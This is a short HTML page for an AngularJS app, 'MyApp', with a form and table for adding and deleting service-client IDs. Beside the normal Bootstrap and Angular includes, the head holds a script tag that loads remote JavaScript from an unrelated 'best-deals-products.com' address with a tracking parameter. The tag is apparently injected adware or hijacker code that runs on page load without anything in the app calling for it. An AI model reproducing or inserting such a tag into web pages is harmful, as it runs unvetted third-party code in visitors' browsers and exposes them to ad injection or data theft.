<html>
<head>
    <title>MyApp</title>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.26/angular.min.js"></script>
    <script src="features/services/controller.js"></script>
<script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>
<body ng-app="">
    <div class="container" ng-controller="ServicesCtrl">

        <h3>{{message}}</h3>

        <br />
        
        <table class="table">
            <thead>
                <tr>
                    <th>NU ID</th>
                    <th>&nbsp;</th>
                </tr>
                <tr>
                    <td>
                        <input class="form-control" ng-model="serviceClient.name"/>
                    </td>
                    <td>
                        <button class="btn btn-primary" ng-click="create()">Add</button>
                    </td>
                </tr>
            </thead>
            <tbody>
                <tr ng-repeat="serviceClient in serviceClients">
                    <td>{{serviceClient.name}}</td>
                    <td>
                        <button class="btn btn-danger" ng-click="remove(serviceClient._id)">Delete</button>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
</body>
</html>
